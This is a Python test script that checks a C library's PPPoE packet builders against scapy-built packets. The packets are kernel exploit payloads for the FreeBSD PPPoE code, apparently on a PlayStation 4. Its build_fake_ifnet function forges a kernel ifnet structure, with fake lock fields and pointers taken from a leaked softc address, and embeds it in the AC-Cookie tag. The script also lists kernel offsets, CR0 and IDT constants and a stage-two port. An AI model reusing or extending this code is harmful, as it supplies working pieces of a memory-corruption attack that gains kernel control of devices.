import sys
from ctypes import *
from struct import pack, unpack
from scapy.all import str2mac
from scapy.layers.ppp import *
from scapy.utils import hexdump

# PPPoE constants

PPPOE_TAG_HUNIQUE = 0x0103
PPPOE_TAG_ACOOKIE = 0x0104

PPPOE_CODE_PADI = 0x09
PPPOE_CODE_PADO = 0x07
PPPOE_CODE_PADR = 0x19
PPPOE_CODE_PADS = 0x65
PPPOE_CODE_PADT = 0xa7

ETHERTYPE_PPPOEDISC = 0x8863
ETHERTYPE_PPPOE = 0x8864

CONF_REQ = 1
CONF_ACK = 2
CONF_NAK = 3
CONF_REJ = 4
ECHO_REQ = 9
ECHO_REPLY = 10

# FreeBSD constants

NULL = 0

PAGE_SIZE = 0x4000

IDT_UD = 6
SDT_SYSIGT = 14
SEL_KPL = 0

CR0_PE = 0x00000001
CR0_MP = 0x00000002
CR0_EM = 0x00000004
CR0_TS = 0x00000008
CR0_ET = 0x00000010
CR0_NE = 0x00000020
CR0_WP = 0x00010000
CR0_AM = 0x00040000
CR0_NW = 0x20000000
CR0_CD = 0x40000000
CR0_PG = 0x80000000

CR0_ORI = CR0_PG | CR0_AM | CR0_WP | CR0_NE | CR0_ET | CR0_TS | CR0_MP | CR0_PE

VM_PROT_READ = 0x01
VM_PROT_WRITE = 0x02
VM_PROT_EXECUTE = 0x04

VM_PROT_ALL = (VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE)

LLE_STATIC = 0x0002
LLE_LINKED = 0x0040
LLE_EXCLUSIVE = 0x2000

LO_INITIALIZED = 0x00010000
LO_WITNESS = 0x00020000
LO_UPGRADABLE = 0x00200000
LO_DUPOK = 0x00400000

LO_CLASSSHIFT = 24

RW_UNLOCKED = 1
MTX_UNOWNED = 4

RW_INIT_FLAGS = ((4 << LO_CLASSSHIFT) | LO_INITIALIZED | LO_WITNESS |
                 LO_UPGRADABLE)
MTX_INIT_FLAGS = ((1 << LO_CLASSSHIFT) | LO_INITIALIZED | LO_WITNESS)

CALLOUT_RETURNUNLOCKED = 0x10

AF_INET6 = 28

IFT_ETHER = 0x6

ND6_LLINFO_NOSTATE = 0xfffe

# FreeBSD offsets

TARGET_SIZE = 0x100

PPPOE_SOFTC_SC_DEST = 0x24
PPPOE_SOFTC_SC_AC_COOKIE = 0x40
PPPOE_SOFTC_SIZE = 0x1c8

LLTABLE_LLTIFP = 0x110
LLTABLE_LLTFREE = 0x118

SOCKADDR_IN6_SIZE = 0x1c


def p8(val):
    return pack('<B', val & 0xff)


def p16(val):
    return pack('<H', val & 0xffff)


def p16be(val):
    return pack('>H', val & 0xffff)


def p32(val):
    return pack('<I', val & 0xffffffff)


def p32be(val):
    return pack('>I', val & 0xffffffff)


def p64(val):
    return pack('<Q', val & 0xffffffffffffffff)


def p64be(val):
    return pack('>Q', val & 0xffffffffffffffff)


HOLE_START = 0x400
HOLE_SPACE = 0x10

LCP_ID = 0x41
IPCP_ID = 0x41

SESSION_ID = 0xffff

STAGE2_PORT = 9020

SOURCE_MAC = '41:41:41:41:41:41'
SOURCE_IPV4 = '41.41.41.41'
SOURCE_IPV6 = 'fe80::4141:4141:4141:4141'

TARGET_IPV4 = '42.42.42.42'

BPF_FILTER = '(ip6) || (pppoed) || (pppoes && !ip)'


def check(c_packet, packet):
    if c_packet == bytes(packet):
        print("\033[32mPASSED\033[0m")
    else:
        print("\033[31mFAILED\033[0m")


class TestPacket:
    def __init__(self, lib_path):
        self.lib = CDLL(lib_path)

    def run(self):
        self.lib.setInterface(c_char_p(b"en10"))
        self.lib.setFirmwareVersion(900)
        print("failed" if self.lib.run() else "success")

    def build_fake_ifnet(self):
        # Fake ifnet
        fake_ifnet = bytearray()

        fake_ifnet += b'A' * (0x48 - len(fake_ifnet))
        fake_ifnet += p64(NULL)  # if_addrhead
        fake_ifnet += b'A' * (0x70 - len(fake_ifnet))
        fake_ifnet += p16(0x0001)  # if_index
        fake_ifnet += b'A' * (0xa0 - len(fake_ifnet))
        fake_ifnet += p8(IFT_ETHER)  # ifi_type
        fake_ifnet += p8(0)  # ifi_physical
        fake_ifnet += p8(0x8 + 0x1)  # ifi_addrlen
        fake_ifnet += b'A' * (0x1b8 - len(fake_ifnet))
        fake_ifnet += p64(self.pppoe_softc + PPPOE_SOFTC_SC_DEST)  # if_addr
        fake_ifnet += b'A' * (0x428 - len(fake_ifnet))
        fake_ifnet += p64(self.pppoe_softc + 0x10 - 0x8)  # nd_ifinfo

        # if_afdata_lock
        fake_ifnet += b'A' * (0x480 - len(fake_ifnet))
        fake_ifnet += p64(NULL)  # lo_name
        fake_ifnet += p32(RW_INIT_FLAGS)  # lo_flags
        fake_ifnet += p32(0)  # lo_data
        fake_ifnet += p64(NULL)  # lo_witness
        fake_ifnet += p64(RW_UNLOCKED)  # rw_lock

        # if_addr_mtx
        fake_ifnet += b'A' * (0x4c0 - len(fake_ifnet))
        fake_ifnet += p64(NULL)  # lo_name
        fake_ifnet += p32(MTX_INIT_FLAGS)  # lo_flags
        fake_ifnet += p32(0)  # lo_data
        fake_ifnet += p64(NULL)  # lo_witness
        fake_ifnet += p64(MTX_UNOWNED)  # mtx_lock

        return fake_ifnet

    def init(self, uniq, ps4_mac):
        self.host_uniq = uniq
        self.pppoe_softc = unpack('<Q', self.host_uniq)[0]
        planted = (self.pppoe_softc + 0x07) & 0xffffffffffff
        self.source_mac = str2mac(planted.to_bytes(6, byteorder='little'))
        self.target_mac = ps4_mac.decode()

        self.lib.setSourceMac(c_char_p(self.source_mac.encode()))
        self.lib.setTargetMac(c_char_p(self.target_mac.encode()))
        self.lib.setPppoeSoftc(c_uint64(self.pppoe_softc))
        self.buffer_size = 4096
        self.buffer = (c_uint8 * self.buffer_size)()

    def call_c_function(self, function_name):
        print(f"===> Testing {function_name}: ", end="")
        getattr(self.lib, function_name).argtypes = [POINTER(c_uint8), c_uint64]
        c_packet_len = getattr(self.lib, function_name)(self.buffer, self.buffer_size)
        return bytes(self.buffer[i] for i in range(c_packet_len))

    def test_pado(self):
        c_packet = self.call_c_function("buildPADO")
        packet = Ether(src=self.source_mac,
                       dst=self.target_mac,
                       type=ETHERTYPE_PPPOEDISC) / \
                 PPPoED(code=PPPOE_CODE_PADO) / \
                 PPPoETag(tag_type=PPPOE_TAG_ACOOKIE, tag_value=self.build_fake_ifnet()) / \
                 PPPoETag(tag_type=PPPOE_TAG_HUNIQUE, tag_value=p64(self.pppoe_softc))
        check(c_packet, packet)

    def test_pads(self):
        c_packet = self.call_c_function("buildPADS")
        packet = Ether(src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOEDISC) / \
                 PPPoED(code=PPPOE_CODE_PADS, sessionid=SESSION_ID) / \
                 PPPoETag(tag_type=PPPOE_TAG_HUNIQUE, tag_value=p64(self.pppoe_softc))
        check(c_packet, packet)


if __name__ == "__main__":
    testPacket = TestPacket(sys.argv[1])
    testPacket.init(b'\x00\x96\xb9\x3c\x6a\xdf\xff\xff',
                    b'2c:cc:44:33:22:11')
    testPacket.test_pado()
    testPacket.test_pads()
